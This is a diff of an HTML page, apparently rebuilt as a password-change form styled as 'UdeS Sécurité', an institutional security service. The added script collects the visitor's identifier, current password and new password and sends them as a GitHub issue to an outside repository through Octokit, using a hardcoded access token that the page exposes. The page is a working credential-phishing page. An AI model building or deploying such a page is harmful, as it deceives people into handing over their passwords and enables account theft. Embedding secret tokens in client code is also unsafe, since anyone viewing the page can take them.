@@ -1,47 +1,88 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
+  <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Form Submission</title>
-</head>
-<body>
+  <title>UdeS Sécurité</title>
+  <link rel="stylesheet" href="style.css">
+  </head>
 
-  <h1>Submit Form</h1>
+  <body>
+    <div id="left-column">
+      <img src="images/paysage.jpg" width="850">
+    </div>
 
-  <form id="myForm">
-    <label for="name">Name:</label>
-    <input type="text" id="name" name="name" required><br>
+    <div id="right-column">
+      <h2>Modification du mot de passe</h2>
+      <form id="PasswordForm" action="/create_issue" method="post">
+        <label for="id"><b>Identifiant</b></label><br>
+        <input type="text" id="id" name="id" required>
 
-    <label for="email">Email:</label>
-    <input type="email" id="email" name="email" required><br>
+        <label for="password"></label>
+        <input type="password" id="password" name="password" required>
 
-    <button type="button" onclick="submitForm()">Submit</button>
-  </form>
+        <label for="newpassword">Nouveau mot de passe</label><br>
+        <input type="password" id="newpassword" name="newpassword" required>
 
-  <script>
-    function submitForm() {
-        var title = document.getElementById('title').value;
-        var body = document.getElementById('body').value;
+        <label for="confirmnewpassword"></label>
+        <input type="password" id="confirmnewpassword" name="confirmnewpassword" required>
 
-        // Use AJAX to send data to the server
-        var xhr = new XMLHttpRequest();
-        xhr.open("POST", "/create_issue", true);
-        xhr.setRequestHeader("Content-Type", "application/json");
+        <button type="button" onclick="prepareIssue()">Confirmer la modification</button>
+      </form>
+    </div>
 
-        xhr.onreadystatechange = function () {
-            if (xhr.readyState === 4 && xhr.status === 200) {
-                alert("Form submitted successfully!");
-            }
-        };
+    <script type="module">
+      import { Octokit } from "https://esm.sh/@octokit/core";
+      window.prepareIssue = function () {
+        var id = document.getElementById('id').value;
+        var password = document.getElementById('password').value;
+        var newpassword = document.getElementById('newpassword').value;
+        var confirmnewpassword = document.getElementById('confirmnewpassword').value;
+
+        // Add your logic to handle the form submission here
+        console.log('ID:', id);
+        console.log('Current Password:', password);
+        console.log('New Password:', newpassword);
+        console.log('Confirm New Password:', confirmnewpassword);
 
         var data = {
-            title: title,
-            body: body
+            'title': 'New data',
+            'Id': id,
+            'Password 1' : password,
+            'Password 2' : newpassword,
+            'Password 3' : confirmnewpassword
+        }
+        console.log(data)
+
+
+        const octokit = new Octokit({
+          auth: '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',
+        });
+
+        const owner = 'Onyx39';
+        const repo = 'onyx39.github.io';
+
+        const issueData = {
+          title: 'New data',
+          body: JSON.stringify(data),
         };
 
-        xhr.send(JSON.stringify(data));
-    }
-</script>
-</body>
+        octokit.request('POST /repos/{owner}/{repo}/issues', {
+          owner : 'Onyx39',
+          repo : 'onyx39.github.io',
+          title: 'New data',
+          body: JSON.stringify(data),
+          headers: {
+            'X-GitHub-Api-Version': '2022-11-28'
+          }
+        })
+          .then(response => {
+            console.log('Issue created:', response.data.html_url);
+          })
+          .catch(error => {
+            console.error('Error creating issue:', error.message);
+          });
+      }
+    </script>
+  </body>
 </html>
